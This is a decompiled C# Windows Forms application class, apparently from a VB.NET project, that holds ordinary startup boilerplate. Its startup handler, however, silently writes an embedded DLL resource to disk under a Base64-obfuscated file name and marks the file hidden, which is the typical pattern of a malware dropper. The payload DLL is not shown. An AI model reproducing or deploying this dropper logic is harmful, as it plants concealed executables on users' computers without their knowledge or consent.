using System;
using System.CodeDom.Compiler;
using System.ComponentModel;
using System.Diagnostics;
using System.IO;
using System.Runtime.CompilerServices;
using System.Text;
using System.Windows.Forms;
using Microsoft.VisualBasic.ApplicationServices;
using o.My.Resources;

namespace o.My;

[EditorBrowsable(EditorBrowsableState.Never)]
[GeneratedCode("MyTemplate", "8.0.0.0")]
internal class MyApplication : WindowsFormsApplicationBase
{
	[MethodImpl(MethodImplOptions.NoOptimization)]
	[EditorBrowsable(EditorBrowsableState.Advanced)]
	[DebuggerHidden]
	[STAThread]
	internal static void Main(string[] args)
	{
		try
		{
			Application.SetCompatibleTextRenderingDefault(WindowsFormsApplicationBase.get_UseCompatibleTextRendering());
		}
		finally
		{
		}
		((WindowsFormsApplicationBase)MyProject.Application).Run(args);
	}

	public static string b12(string a)
	{
		byte[] bytes = Convert.FromBase64String(a);
		return Encoding.Default.GetString(bytes);
	}

	private void MyApplication_Startup(object sender, StartupEventArgs e)
	{
		if (!File.Exists(Form1.xx + b12("XERMTFJ1bi5kbGw=")))
		{
			File.WriteAllBytes(Form1.xx + b12("XERMTFJ1bi5kbGw="), o.My.Resources.Resources.DLLRun);
			File.SetAttributes(Form1.xx + b12("XERMTFJ1bi5kbGw="), FileAttributes.Hidden);
		}
	}

	[DebuggerStepThrough]
	public MyApplication()
		: base((AuthenticationMode)0)
	{
		//IL_0010: Unknown result type (might be due to invalid IL or missing references)
		//IL_001a: Expected O, but got Unknown
		((WindowsFormsApplicationBase)this).add_Startup(new StartupEventHandler(MyApplication_Startup));
		((WindowsFormsApplicationBase)this).set_IsSingleInstance(false);
		((WindowsFormsApplicationBase)this).set_EnableVisualStyles(true);
		((WindowsFormsApplicationBase)this).set_SaveMySettingsOnExit(true);
		((WindowsFormsApplicationBase)this).set_ShutdownStyle((ShutdownMode)0);
	}

	[DebuggerStepThrough]
	protected override void OnCreateMainForm()
	{
		((WindowsFormsApplicationBase)this).set_MainForm((Form)(object)MyProject.Forms.Form1);
	}
}
